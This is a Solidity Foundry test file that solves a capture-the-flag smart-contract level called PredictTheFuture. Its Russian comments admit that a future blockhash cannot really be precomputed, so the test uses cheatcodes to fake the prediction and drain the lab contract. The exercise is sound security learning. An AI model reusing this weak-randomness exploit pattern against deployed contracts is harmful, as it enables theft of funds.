// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/06_PredictTheFuture/PredictTheFuture.sol";

// forge test --match-contract PredictTheFutureTest -vvvv
contract PredictTheFutureTest is BaseTest {
    PredictTheFuture instance;

    function setUp() public override {
        super.setUp();
        instance = new PredictTheFuture{value: 0.01 ether}();

        vm.roll(143242);
    }
    
// В данном задании у меня была идея заранее расчитать answer как
// uint256(keccak256(abi.encodePacked(blockhash(block.number + 1), block.timestamp + timeInterval))) % 10;
// Однако все оказалось не так просто, как выяснилось, нельзя вот так вот просто взять
// И заранее посчитать blockhash(block.number + 1). Поэтому такой финт ушами не сработал.
// Однако, почитав сайты, я выяснил, что в целом, в теории, если быть уверенным что именно мой блок окажется следующим в цепи,
// то на основании данных моего будущего блока, сложно, но все таки реально угадать хэш будущего блока.
// Поэтому мой тест эмулирует ситуацию как буд-то я расчитал хэш ^_^

    function testExploitLevel() public {
        uint256 startTimestamp = 1672531200;
        uint256 timeInterval = 15;

        vm.warp(startTimestamp);

        // Процесс расчета хэша для будущего
        vm.roll(143244);
        uint256 answer = uint256(keccak256(abi.encodePacked(blockhash(block.number -1), block.timestamp + timeInterval))) % 10;
        vm.roll(143242);

        instance.setGuess{value: 0.01 ether}(uint8(answer));

        // Симулирую прошедшее время
        vm.roll(143244);
        vm.warp(block.timestamp + timeInterval);

        instance.solution();
        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
